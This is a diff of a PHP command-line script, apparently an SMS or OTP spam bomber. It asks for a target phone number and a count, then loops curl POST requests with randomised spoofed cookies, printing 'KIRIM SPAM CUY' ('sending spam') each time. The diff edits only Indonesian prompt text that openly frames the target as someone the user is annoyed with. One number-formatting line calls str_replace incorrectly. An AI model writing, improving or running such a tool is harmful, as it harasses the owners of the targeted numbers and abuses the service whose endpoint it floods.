@@ -1,16 +1,16 @@
 <?php
 echo "COPYRIGHT : LXN TEAM\n\n";
-echo "Nomor Target?\nInput : ";
+echo "Nomor Target YANG U JENGKEL?\nInput : ";
 $nomer = trim(fgets(STDIN));
 if(strlen($nomer)==11){
 	$nomer = str_replace("0","62".$nomer);
 }elseif(strlen($nomer)>12){
 	$nomer = str_replace("62","0",$nomer);
 }
-echo "Target: $nomer (y/n)";
+echo "BENER GA NI Target: $nomer (y/n)";
 $cek = trim(fgets(STDIN));
 if($cek=="n") exit("Stopped!\n");
-echo "Jumlah?\nInput : ";
+echo "Jumlah? JANGAN BANYAK BAYAK, KASIHAN\nInput : ";
 $jumlah = trim(fgets(STDIN));
 for($a=0;$a<$jumlah;$a++) {
 	$rand1 = md5(rand(12345678,98765432));
@@ -51,5 +51,5 @@ Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
 	$asw = curl_exec($ch);
 	curl_close($ch);
-	print $a.$nomer." [Sending]\n";
+	print $a.$nomer." [KIRIM SPAM CUY]\n";
 }
